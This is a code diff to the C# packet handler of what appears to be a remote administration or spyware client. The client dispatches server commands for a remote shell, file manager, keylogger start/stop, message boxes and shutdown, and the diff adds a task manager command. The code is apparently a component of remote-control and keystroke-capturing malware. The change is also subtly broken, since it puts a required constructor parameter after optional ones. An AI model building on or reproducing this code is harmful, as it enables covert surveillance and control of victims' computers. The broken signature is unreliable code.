@@ -12,17 +12,27 @@ namespace Client.Networking
         private readonly Action<SystemInfoRequest> _onSystemInfoRequest;
         private readonly Action<RemoteShellRequest> _onRemoteShellRequest;
         private readonly Action<FileManagerRequest> _onFileManagerRequest;
+        private readonly Action<TaskManagerRequest> _onTaskManagerRequest;
         private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
         private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
         private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
         private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
         private readonly Action<ShutdownActionRequest> _onShutdownActionRequest;
 
-        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest,Action<MessageBoxRequest> onMessageBoxRequest, Action<ShutdownActionRequest> onShutdownActionRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
+        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, 
+                             Action<RemoteShellRequest> onRemoteShellRequest, 
+                             Action<FileManagerRequest> onFileManagerRequest,
+                             Action<MessageBoxRequest> onMessageBoxRequest, 
+                             Action<ShutdownActionRequest> onShutdownActionRequest, 
+                             Action<KeyLoggerStart>? onKeyLoggerStart = null, 
+                             Action<KeyLoggerStop>? onKeyLoggerStop = null, 
+                             Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null, 
+                             Action<TaskManagerRequest> onTaskManagerRequest)
         {
             _onSystemInfoRequest = onSystemInfoRequest;
             _onRemoteShellRequest = onRemoteShellRequest;
             _onFileManagerRequest = onFileManagerRequest;
+			      _onTaskManagerRequest = onTaskManagerRequest;
             _onKeyLoggerStart = onKeyLoggerStart;
             _onKeyLoggerStop = onKeyLoggerStop;
             _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
@@ -67,6 +77,14 @@ namespace Client.Networking
                         if (klStart != null && _onKeyLoggerStart != null)
                         {
                             _onKeyLoggerStart(klStart);
+                        }
+                        break;
+                    
+                    case PacketType.TaskManagerRequest:
+                        var taskReq = JsonHelper.Deserialize<TaskManagerRequest>(json);
+                        if (taskReq != null)
+                        {
+                            _onTaskManagerRequest(taskReq);
                         }
                         break;
 
